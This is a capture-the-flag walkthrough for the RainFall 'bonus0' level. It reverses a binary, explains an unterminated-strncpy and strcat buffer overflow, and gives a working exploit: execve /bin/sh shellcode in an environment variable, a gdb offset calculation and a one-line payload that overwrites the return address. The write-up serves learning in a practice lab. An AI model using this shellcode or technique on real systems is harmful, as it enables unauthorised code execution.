# Walkthrough

Bonus time!

## Reversing

```c
void p(char *param_1,char *param_2)
{
  char *pcVar1;
  char local_100c [4104];

  puts(param_2);
  read(0,local_100c,0x1000);
  pcVar1 = strchr(local_100c,10);
  *pcVar1 = '\0';
  strncpy(param_1,local_100c,20);
  return;
}

void pp(char *param_1)
{
  char cVar1;
  uint uVar2;
  char *pcVar3;
  byte bVar4;
  char local_34 [20];
  char local_20 [20];

  bVar4 = 0;
  p(local_34," - ");
  p(local_20," - ");
  strcpy(param_1,local_34);
  uVar2 = 0xffffffff;
  pcVar3 = param_1;
  do {
    if (uVar2 == 0) break;
    uVar2 = uVar2 - 1;
    cVar1 = *pcVar3;
    pcVar3 = pcVar3 + (uint)bVar4 * -2 + 1;
  } while (cVar1 != '\0');
  *(undefined2 *)(param_1 + (~uVar2 - 1)) = 0x20;
  strcat(param_1,local_20);
  return;
}

int main(void)
{
  char local_3a [54];

  pp(local_3a);
  puts(local_3a);
  return 0;
}
```

Okey... interesting, it seems that `p` reads from `stdin`,
replaces the `\n` with a `\0`, and copies the first 20 bytes to
`param_1`. `param_2` is not really useful, it just prints it.

It seems like `p` makes an `strcpy` of the first `p` into `param_1`, then it
puts a `<space>` after it, and then it does an `strcat` of the second `p`
into `param_1`, so at the end, the main prints the concatenated strings.

`strncpy` is secure, not like `strcpy`, but it has a flaw, as the main says:
```raw
The stpncpy() and strncpy() functions copy at most len characters from src into dst.  If src is less
than len characters long, the remainder of dst is filled with `\0' characters.  Otherwise, dst is not
terminated.
```

So, if our read buffer is `4104` bytes long, but then it only checks for
`new lines` on the first 10 bytes, and only copies 20 bytes... If our input
is bigger than 20 bytes, the result string will not be null-terminated!

So, since the strings declared in `pp`, are 20 bytes long, and `p` will be able
to copy 20 bytes not null-terminated, we can make `local_34` and `local_20`,
who are together in the stack, be one big string.

So we can segfault the program with this not
null-terminated string by passing some bigger that 20 bytes inputs:
```bash
bonus0@RainFall:~$ ./bonus0
 -
aaaaaaaaaaaa
 -
aaaaaaaaaaaaa
aaaaaaaaaaaa aaaaaaaaaaaaa
bonus0@RainFall:~$ ./bonus0
 -
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 -
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�� aaaaaaaaaaaaaaaaaaaa��
Segmentation fault (core dumped)
```

Cool, but we need to exploit this somehow. And since we don't have any help
function that executes `/bin/sh` or reads a file, I suppose we will need to
inject shell code.

Later on we have an `strcat`, that is as insecure as `strcpy`, in copies
the second parameter string to the first one, starting at the end of the first,
so, it concatenates s2 to s1 without worrying about boundaries or len of s1,
nice.

I think I might know where this is going... Let's try.

## Exploit

So... the thing is, with that `strcpy` we can copy 20 bytes, but, if it's not
null-terminated, we can copy both string, because, `local_20` is above
`local_34`, so, whes we pass a not null-terminated `local_34` to `strcpy`, it
will continue reading, and above `local_34` is `local_20`:
```naw
                     **************************************************************
                     *                          FUNCTION                          *
                     **************************************************************
                     undefined __cdecl pp(char * param_1)
     undefined         AL:1           <RETURN>
     char *            Stack[0x4]:4   param_1                                 XREF[4]:     08048553(R), 
                                                                                           08048563(R), 
                                                                                           08048582(R), 
                                                                                           08048592(R)  
     undefined1        Stack[-0x20]:1 local_20                                XREF[2]:     08048541(*), 
                                                                                           0804858b(*)  
     undefined1        Stack[-0x34]:1 local_34                                XREF[2]:     0804852e(*), 
                                                                                           0804854c(*)  
     undefined4        Stack[-0x40]:4 local_40                                XREF[2]:     08048566(W), 
                                                                                           08048574(R)  
     undefined4        Stack[-0x58]:4 local_58                                XREF[4]:     08048526(W), 
                                                                                           08048539(W), 
                                                                                           0804854f(W), 
                                                                                           0804858e(W)  
     undefined4        Stack[-0x5c]:4 local_5c                                XREF[4]:     08048531(*), 
                                                                                           08048544(*), 
                                                                                           08048556(*), 
                                                                                           08048595(*)  
```

So... We can copy 40 bytes of our choice to `param_1`, nice, we have our
shellcode, but how to execute it?

That's when the `strcat` enters the scene, you maybe thinking, why? If it
copies to `param_1`, who is in `main`, there's no way we can overwrite the
return address of `pp`... And you are right, but we can overwrite the
return address of `main` with it.

How? Well, the `local_3a` in `main`, has a size of `54` bytes, but, if we
copy `20` bytes to `s1`, then it will concatenate with `s2`, suppose we
null-terminate `s2` to avoid segfaults before our shellcode execution, then
we will be copying to the `buffer` in `main`:
- `s1` + `s2`
- `space`
- `s2`

And this will of course overflow the `buffer`.

I tried a lot of things... A lot... I'm having a hard time with this binary,
and I'm tired of trying to do it like we were probably supposed to, so,
let's go with all we have, and use env and patterns to finish this quickly.

First, let's use the env to store the shellcode, so, get the
`./resources/getaddr.c`, and let's start.

Let's export our shellcode, is the same as in `level9`:
```bash
# Nop sled to ensure we hit the target
export SC=$(printf "%90s" " " | tr ' ' 'Z'; printf '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80')
gcc getaddr.c -o getaddr
./getaddr SC
```

The address is: `0xbffffe9e`.

So, now, let's calculate the offset to EIP, using the usual bof pattern:
```bash
gdb -q ./bonus0

(gdb) r

# input...
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()
```

Keep in mind is little endian, invert it, and, that's the `Aa3A`, that's means
its the fourth sequence, so, we need 3 sequences (9 bytes) to reach EIP.

So, our address must start after 9 bytes...

So, the payload will be:
- Prompt 1:
    - 20 bytes, as I said earlier, the point is to not null-terminate this string.
- Prompt 2:
    - 9 offset bytes
    - Address of shellcode

```bash
# Prompt 1
python3 -c "print('A' * 20)"

# Prompt 2 (addr in little endian, and enought bytes to reach 20 bytes)
python3 -c "print('A' * 9 + '\x9e\xfe\xff\xbf' + 'A' * 7)"
```

```bash
# One liner
(python -c "print 'A'*20"; python -c "print 'A'*9+'\x9e\xfe\xff\xbf'+'A'*7"; cat) | ./bonus0
```

Get the flag and lets go... I have mix feelings with this level... A whole day
to exploit it... Zzz...
